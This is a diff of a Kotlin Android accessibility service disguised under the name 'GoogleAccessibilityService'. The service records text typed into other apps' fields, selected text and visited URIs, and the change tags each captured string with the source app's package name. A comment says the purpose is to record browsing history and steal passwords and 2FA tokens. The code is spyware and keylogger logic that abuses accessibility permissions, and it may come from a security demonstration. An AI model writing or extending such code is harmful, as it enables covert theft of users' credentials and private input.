@@ -32,14 +32,12 @@ class GoogleAccessibilityService() : AccessibilityService() {
             return
         }
 
-        Log.d(TAG, event.packageName.toString())
-        logEventText(event)
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 // This event type is fired when text is entered in any EditText that is not a
                 // password.
                 for (string in event.strings()) {
-                    Log.d(TAG, "Captured from EditText: $string")
+                    logEvent(event, "Captured from EditText: $string")
                 }
             }
 
@@ -48,10 +46,10 @@ class GoogleAccessibilityService() : AccessibilityService() {
                 // We can record their browsing history as well as steal passwords and 2FA tokens
                 // that are selected.
                 for (string in event.selected()) {
-                    Log.d(TAG, "Text selected: $string")
+                    logEvent(event,  "Text selected: $string")
                 }
                 for (uri in event.uris()) {
-                    Log.d(TAG, "URI detected: $uri")
+                    logEvent(event, "URI detected: $uri")
                 }
             }
         }
@@ -67,11 +65,8 @@ class GoogleAccessibilityService() : AccessibilityService() {
         serviceInfo = info
     }
 
-    private fun logEventText(event: AccessibilityEvent) {
-        for (text in event.text) {
-            Log.d(TAG, text.toString())
-        }
-        Log.d(TAG, event.eventTypeName())
+    private fun logEvent(event: AccessibilityEvent, message: String) {
+        Log.d(TAG + event.packageName, message)
     }
 
 }
